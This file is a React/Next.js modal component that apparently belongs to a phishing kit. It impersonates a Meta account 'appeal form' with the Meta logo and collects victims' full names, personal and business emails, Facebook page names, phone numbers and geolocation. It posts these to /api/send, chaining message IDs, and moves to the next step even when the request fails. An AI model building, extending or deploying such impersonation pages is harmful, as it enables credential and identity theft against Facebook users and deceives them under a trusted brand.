'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormField {
    name: keyof FormData;
    labelKey: keyof typeof DEFAULT_TEXTS;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'information', labelKey: 'investigateInfo', type: 'textarea' },
    { name: 'fullName', labelKey: 'fullName', type: 'text' },
    { name: 'personalEmail', labelKey: 'personalEmail', type: 'email' },
    { name: 'businessEmail', labelKey: 'businessEmail', type: 'email' },
    { name: 'facebookPageName', labelKey: 'facebookPageName', type: 'text' }
];

const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });

    const { geoInfo, messageId, setModalOpen, setUserData, setMessageId, setMessageContent, resetFormSession } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setIsLoading(true);

        const userDataPayload = {
            fullName: formData.fullName,
            birthDate: '',
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phoneNumber,
            facebookPageName: formData.facebookPageName,
            information: formData.information
        };

        setUserData(userDataPayload);

        const message = buildAppealMessage({
            geoInfo,
            userData: userDataPayload
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
                setMessageContent(message);
            }
            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{texts.appealFormTitle}</p>
                    <button
                        type='button'
                        onClick={() => {
                            resetFormSession();
                            setModalOpen(false);
                        }}
                        className='flex h-8 w-8 items-center justify-center rounded-full transition-colors hover:bg-[#e2eaf2]'
                        aria-label={texts.closeModal}
                    >
                        <FontAwesomeIcon icon={faXmark} size='xl' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-4'>
                    <div className='flex flex-col gap-2 py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='font-sans'>{texts[field.labelKey]}</p>
                                {field.type === 'textarea' ? (
                                    <textarea
                                        name={field.name}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                        className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                                        rows={3}
                                    />
                                ) : (
                                    <input
                                        name={field.name}
                                        type={field.type}
                                        value={formData[field.name]}
                                        onChange={handleInputChange}
                                        className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                                    />
                                )}
                            </div>
                        ))}
                        <p className='font-sans'>{texts.mobilePhone}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5'
                            }}
                        />
                        <div className='flex items-center gap-2 pt-2'>
                            <input type='checkbox' className='cursor-pointer' />
                            <p className='cursor-pointer'>{texts.agreeTermsBoss}</p>
                        </div>
                        <button
                            type='submit'
                            disabled={isLoading}
                            className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                        >
                            {isLoading ? (
                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
                            ) : (
                                texts.submitBtn
                            )}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default InitModal;
